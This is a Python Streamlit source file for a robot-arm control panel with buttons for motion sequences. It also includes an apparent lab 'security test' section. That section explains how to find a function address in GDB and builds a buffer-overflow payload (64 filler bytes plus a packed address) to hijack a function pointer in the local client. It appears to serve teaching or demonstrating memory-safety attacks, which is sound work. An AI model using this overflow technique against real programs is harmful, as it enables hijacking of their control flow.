import streamlit as st
import subprocess
import os
import time
import threading
from streamlit.runtime.scriptrunner import add_script_run_ctx
import sys
import struct

# --- Configuration ---
CLIENT_EXECUTABLE = "/home/rapid/ssl_project_c/src/client_robot" # Check path
DEFAULT_SERVER_IP = "192.168.1.100"

# --- Session State Initialization ---
def initialize_session_state():
    if 'executing' not in st.session_state: st.session_state.executing = False
    if 'status_message' not in st.session_state: st.session_state.status_message = ""
    if 'command_history' not in st.session_state: st.session_state.command_history = []

# --- Client Execution Function (Unchanged from previous version) ---
def execute_client_command(command_identifier, server_ip, payload_bytes=None):
    """ Executes the client robot command. Reads stdin only for 'attack'. """
    if st.session_state.executing: st.warning("Command busy."); return
    st.session_state.executing = True
    display_command = f"{command_identifier}{' <payload_via_stdin>' if payload_bytes else ''}"
    st.session_state.status_message = f"Executing: {display_command}"; st.rerun()

    start_time = time.time(); combined_output = ""; exit_code = -1; status = "Error"
    try:
        env = os.environ.copy(); env["COMMAND"] = command_identifier
        process_args = [CLIENT_EXECUTABLE, server_ip]
        stdin_pipe, use_text_mode, input_data = None, True, None
        if command_identifier == "attack" and payload_bytes is not None:
            st.write("Debug: Using stdin pipe/binary mode for attack.")
            stdin_pipe, use_text_mode, input_data = subprocess.PIPE, False, payload_bytes
        process = subprocess.Popen(process_args, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=stdin_pipe, text=use_text_mode, env=env)
        stdout_data, stderr_data = process.communicate(input=input_data); exit_code = process.returncode
        stdout = stdout_data; stderr = stderr_data
        if not use_text_mode:
            stdout = stdout_data.decode(sys.stdout.encoding or 'utf-8', errors='replace') if stdout_data else ""
            stderr = stderr_data.decode(sys.stderr.encoding or 'utf-8', errors='replace') if stderr_data else ""
        combined_output = f"--- STDOUT ---\n{stdout.strip()}\n--- STDERR ---\n{stderr.strip()}"
        if exit_code == 0: status = "Success"; st.session_state.status_message = f"Completed: {display_command}"
        elif command_identifier == "attack" and "Control Hijacked!" in stdout + stderr:
            status = "Success (Hijacked!)"; st.session_state.status_message = f"Attack Succeeded: {display_command}"
        else: status = "Failed"; st.session_state.status_message = f"Failed: {display_command} (Exit: {exit_code})"
    except FileNotFoundError: st.error(f"Error: Client not found '{CLIENT_EXECUTABLE}'."); combined_output = "Client not found."; status = "Error"
    except Exception as e: st.error(f"Error: {e}"); combined_output = str(e); status = "Error"; exit_code = -1
    finally:
        duration = time.time() - start_time
        st.session_state.command_history.append({
            "command": display_command, "status": status, "time": time.strftime("%H:%M:%S"),
            "output": combined_output, "duration": duration, "exit_code": exit_code })
        st.session_state.executing = False; st.rerun()

# --- Thread Starter ---
def start_command_thread(cmd_identifier, ip_addr, payload=None):
     thread = threading.Thread(target=execute_client_command, args=(cmd_identifier, ip_addr, payload))
     add_script_run_ctx(thread); thread.start()

# --- Main UI ---
def main():
    st.set_page_config(page_title="Robot Control", layout="wide")
    if not os.path.exists(CLIENT_EXECUTABLE): st.error(f"Client not found: {CLIENT_EXECUTABLE}"); st.stop()
    initialize_session_state()

    st.title("🔒 Secure Robot Arm Controller (Sequences)")
    st.write("Control interface with sequence execution and final hash verification.")

    server_ip = st.text_input("Server IP Address", DEFAULT_SERVER_IP)

    st.markdown("---")
    st.subheader("Command Sequences")

    # === MODIFIED: Sequence Buttons ===
    cols = st.columns(3)
    with cols[0]:
        if st.button("Seq 1: Spin 90° ➡️ Rest", key="seq1", disabled=st.session_state.executing, use_container_width=True):
            # Send "seq1" identifier
            start_command_thread("seq1", server_ip)
    with cols[1]:
        if st.button("Seq 2: Spin 90° ➡️ Spin 180°", key="seq2", disabled=st.session_state.executing, use_container_width=True):
             # Send "seq2" identifier
             start_command_thread("seq2", server_ip)
    with cols[2]:
        if st.button("Seq 3: Spin 180° ➡️ Rest", key="seq3", disabled=st.session_state.executing, use_container_width=True):
            # Send "seq3" identifier
            start_command_thread("seq3", server_ip)
    # === === === === === === === ===

    # === Attack Section (Unchanged) ===
    st.markdown("---")
    st.subheader("⚠️ Security Test: Function Pointer Hijack")
    st.markdown("1. Compile `client_robot.c` with `-no-pie -fno-pie`.\n2. Run `gdb ./client_robot`.\n3. In GDB: `info functions attack_success_indicator`.\n4. Enter the address below.")
    target_addr_hex = st.text_input("Target Function Address (e.g., 0x401234)", "0x401234")
    attack_payload_bytes = None; attack_button_enabled = False; payload_error = ""
    try:
        target_function_address = int(target_addr_hex, 16)
        packed_address = struct.pack('<Q', target_function_address)
        attack_payload_bytes = b'A' * 64 + packed_address
        st.code(f"Payload: {repr(attack_payload_bytes[:64])} + {repr(packed_address)} ({len(attack_payload_bytes)} bytes)", language=None)
        attack_button_enabled = not st.session_state.executing
    except Exception as e: payload_error = f"Invalid address or packing error: {e}"; st.error(payload_error); attack_button_enabled = False
    if st.button("💥 Launch Function Pointer Hijack Attack", key="attack", disabled=not attack_button_enabled):
        if attack_payload_bytes: start_command_thread("attack", server_ip, attack_payload_bytes)
        else: st.error(f"Cannot launch attack: {payload_error or 'Payload error.'}")
    # === === === === === === === ===

    # --- Status and History Display (Unchanged) ---
    st.markdown("---")
    if st.session_state.status_message:
        # ... (same status message display logic as before) ...
        if "Failed" in st.session_state.status_message: st.error(st.session_state.status_message)
        elif "Hijacked!" in st.session_state.status_message: st.warning(st.session_state.status_message)
        elif "Completed" in st.session_state.status_message or "Success" in st.session_state.status_message: st.success(st.session_state.status_message)
        else: st.info(st.session_state.status_message) # Executing...
    if st.session_state.executing: st.warning("⏳ Command in progress...")
    st.markdown("---")
    st.header("Command History")
    if st.button("Clear History"): st.session_state.command_history = []; st.session_state.status_message = ""; st.rerun()
    for item in reversed(st.session_state.command_history):
        # ... (same history display logic as before) ...
        status_color = "green";
        if item['status'] == "Failed": status_color = "red"
        elif item['status'] == "Error": status_color = "orange"
        elif "Hijacked!" in item['status']: status_color = "magenta"
        with st.expander(f"[{item['time']}] {item['command']} -> <span style='color:{status_color}; font-weight:bold;'>{item['status']}</span> ({(item.get('duration', 0)):.2f}s | Exit: {item.get('exit_code', 'N/A')})", expanded=False):
            st.code(item.get('output', 'No output captured'), language='text')

if __name__ == "__main__":
    main()
